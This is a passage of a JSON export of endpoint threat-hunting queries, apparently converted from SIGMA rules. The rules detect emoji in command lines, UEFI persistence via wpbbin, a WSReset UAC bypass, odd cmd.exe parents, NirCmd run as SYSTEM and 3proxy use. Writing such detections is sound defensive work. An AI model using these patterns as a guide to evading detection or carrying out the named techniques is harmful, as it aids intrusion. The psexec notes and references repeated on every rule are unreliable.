\"\ud83d\udc6c\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc6b\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd7\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd7\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd7\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc7\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83c\udfc2\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83c\udfcc\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcc\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83c\udfcc\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc4\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc4\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83c\udfc4\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udea3\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udea3\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udea3\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfca\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfca\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83c\udfca\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\u26f9\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\u26f9\ud83c\udffb\" or tgt.process.cmdline contains \"\u26f9\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcb\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcb\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83c\udfcb\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb4\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb4\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udeb4\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb5\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb5\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udeb5\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd38\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd38\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd38\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3d\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3d\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd3d\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3e\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3e\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd3e\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd39\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd39\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd39\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd8\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd8\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd8\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udec0\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udecc\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc4b\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd1a\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udd90\ud83c\udffc\" or tgt.process.cmdline contains \"\u270b\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udd96\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc4c\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd0c\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd0f\ud83c\udffc\" or tgt.process.cmdline contains \"\u270c\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd1e\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef0\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd1f\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd18\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd19\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef5\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef2\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef3\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef4\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc48\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc49\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc46\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udd95\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc47\ud83c\udffc\" or tgt.process.cmdline contains \"\u261d\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc4d\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc4e\ud83c\udffc\" or tgt.process.cmdline contains \"\u270a\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc4a\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd1b\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd1c\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc4f\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef6\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\ude4c\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc50\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd32\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\ude4f\ud83c\udffc\" or tgt.process.cmdline contains \"\u270d\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udcaa\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddb5\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddb6\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc42\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddbb\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc43\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc76\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc67\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd2\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc66\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83d\udc71\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc71\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc71\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc75\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd3\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc74\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc72\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc73\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc73\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc73\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd5\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc6e\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc6e\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc6e\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc77\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc77\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc77\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc82\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc82\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc82\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd75\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd75\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udd75\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc70\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc70\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc70\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd35\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd35\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd35\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc78\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udec5\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd34\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd77\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddb8\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb8\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddb8\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb9\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb9\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddb9\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd36\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udf84\" or tgt.process.cmdline contains \"\ud83c\udf85\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd9\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd9\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd9\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddd\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddd\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udddd\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddb\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddb\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udddb\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddc\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddc\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udddc\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddda\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddda\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddda\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc7c\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd30\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udec4\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udec3\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd31\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83d\ude47\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude47\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\ude47\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc81\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc81\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc81\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude45\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude45\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\ude45\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude46\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude46\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\ude46\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4b\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4b\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\ude4b\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcf\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcf\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddcf\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd26\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd26\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd26\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd37\ud83c\udffc\u200d\u2640\ufe0f\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1011
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of the binary \"wpbbin\" which is used as part of the UEFI based persistence method described in the reference section",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1542"
            ],
            "name": "UEFI Persistence Via Wpbbin - ProcessCreation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.image.path=\"C:\\Windows\\System32\\wpbbin.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1012
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the pattern of UAC Bypass via WSReset usable by default sysmon-config",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "UAC Bypass WSReset",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\wsreset.exe\" and (tgt.process.integrityLevel in (\"High\",\"System\",\"S-1-16-16384\",\"S-1-16-12288\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1013
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious parent process for cmd.exe",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Unusual Parent Process For Cmd.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\cmd.exe\" and (src.process.image.path contains \"\\csrss.exe\" or src.process.image.path contains \"\\ctfmon.exe\" or src.process.image.path contains \"\\dllhost.exe\" or src.process.image.path contains \"\\epad.exe\" or src.process.image.path contains \"\\FlashPlayerUpdateService.exe\" or src.process.image.path contains \"\\GoogleUpdate.exe\" or src.process.image.path contains \"\\jucheck.exe\" or src.process.image.path contains \"\\jusched.exe\" or src.process.image.path contains \"\\LogonUI.exe\" or src.process.image.path contains \"\\lsass.exe\" or src.process.image.path contains \"\\regsvr32.exe\" or src.process.image.path contains \"\\SearchIndexer.exe\" or src.process.image.path contains \"\\SearchProtocolHost.exe\" or src.process.image.path contains \"\\SIHClient.exe\" or src.process.image.path contains \"\\sihost.exe\" or src.process.image.path contains \"\\slui.exe\" or src.process.image.path contains \"\\spoolsv.exe\" or src.process.image.path contains \"\\sppsvc.exe\" or src.process.image.path contains \"\\taskhostw.exe\" or src.process.image.path contains \"\\unsecapp.exe\" or src.process.image.path contains \"\\WerFault.exe\" or src.process.image.path contains \"\\wermgr.exe\" or src.process.image.path contains \"\\wlanext.exe\" or src.process.image.path contains \"\\WUDFHost.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1014
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of NirCmd tool for command execution as SYSTEM user",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1569"
            ],
            "name": "PUA - NirCmd Execution As LOCAL SYSTEM",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \" runassystem \") | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1015
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of 3proxy, a tiny free proxy server",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1572"
            ],
            "name": "PUA - 3Proxy Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\3proxy.exe\" or tgt.process.displayName=\"3proxy - tiny proxy server\" or tgt.process.cmdline contains \".exe -i127.0.0.1 -p\"))",
